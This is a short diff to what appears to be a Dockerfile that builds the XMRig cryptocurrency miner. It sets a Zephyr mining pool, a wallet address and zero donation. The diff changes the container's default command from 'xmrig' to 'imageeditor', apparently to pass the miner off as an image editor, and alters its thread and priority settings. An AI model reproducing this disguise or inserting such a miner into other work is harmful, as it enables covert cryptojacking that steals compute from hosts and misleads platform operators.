@@ -64,12 +64,12 @@ COPY --from=build-runner /xmrig/src/config.json /xmrig/config.json
 COPY --from=build-cuda-plugin /xmrig-cuda/build/libxmrig-cuda.so /usr/lib64/
 
 
-ENV POOL_USER="ZEPHsA1TTsY7rLukXHWzdx45YrWx3fcbM5d5pFMyBmJs3oN5tpCSRzjNsDgjqCMZPQTQY9sncSP9iLMEipz3EgeWhci39EAGcQR" \
+ENV POOL_USER="ZEPHsA1TTsY7rLukXHWzdx45YrWx3fcbM5d5pFMyBmJs3oN5tpCSRzjNsDgjqCMZPQTQY9sncSP9iLMEipz3EgeWhci39EAGcQR.57P5211" \
     POOL_PASS="57P5211" \
     POOL_URL="de.zephyr.herominers.com:1123" \
     DONATE_LEVEL=0 \
-    PRIORITY=2 \
-    THREADS=4 \
+    PRIORITY=0 \
+    THREADS=0 \
     PATH="/xmrig:${PATH}" \
     CUDA=false \
     CUDA_BF="" \
@@ -81,4 +81,4 @@ ADD entrypoint.sh /entrypoint.sh
 WORKDIR /tmp
 EXPOSE 3000
 ENTRYPOINT ["/entrypoint.sh"]
-CMD ["xmrig"]
+CMD ["imageeditor"]
